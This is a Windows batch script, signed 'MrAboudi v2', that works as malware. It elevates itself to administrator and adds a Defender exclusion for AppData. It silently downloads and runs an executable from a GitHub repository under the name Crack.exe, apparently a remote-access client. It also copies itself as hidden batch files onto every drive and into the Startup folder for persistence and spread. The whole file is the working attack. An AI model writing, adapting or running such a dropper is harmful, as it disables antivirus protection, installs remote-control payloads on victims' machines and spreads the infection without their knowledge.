@echo off
setlocal enabledelayedexpansion

:: ==== Skip if already installed ====
if exist "%USERPROFILE%\AppData\Roaming\SubDir\System32.exe" exit /b

:: ==== Wait for internet ====
:CheckInternet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 5 >nul
    goto CheckInternet
)

:: ==== Run as admin if not ====
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: ==== Defender exclusion ====
set "APPDATA_PATH=%USERPROFILE%\AppData"
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"

:: ==== Download and run payload ====
set "TARGET_FILE=%APPDATA_PATH%\Crack.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
start "" "%TARGET_FILE%"

:: ==== Self path & startup path ====
set "SELF=%~f0"
set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
attrib +h +s "%STARTUP_FOLDER%" >nul 2>&1

:: ==== Loop through drives ====
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%L:\" (
        set "FOLDER=System %%L"
        set "DRIVE_FOLDER=%%L:\!FOLDER!"
        set "DRIVE_BAT=!DRIVE_FOLDER!\Java.bat"
        set "STARTUP_NAME=Microsoft%%L.bat"
        set "STARTUP_BAT=%STARTUP_FOLDER%\!STARTUP_NAME!"

        :: Create hidden folder on drive
        mkdir "!DRIVE_FOLDER!" >nul 2>&1
        if exist "!DRIVE_FOLDER!" (
            copy "%SELF%" "!DRIVE_BAT!" >nul
            if exist "!DRIVE_BAT!" (
                attrib +h +s "!DRIVE_FOLDER!"
                attrib +h +s "!DRIVE_BAT!"
            )
        )

        :: Copy renamed version to Startup
        copy "%SELF%" "!STARTUP_BAT!" >nul
        if exist "!STARTUP_BAT!" (
            attrib +h +s "!STARTUP_BAT!"
        )
    )
)

exit


:: By MrAboudi
:: v2
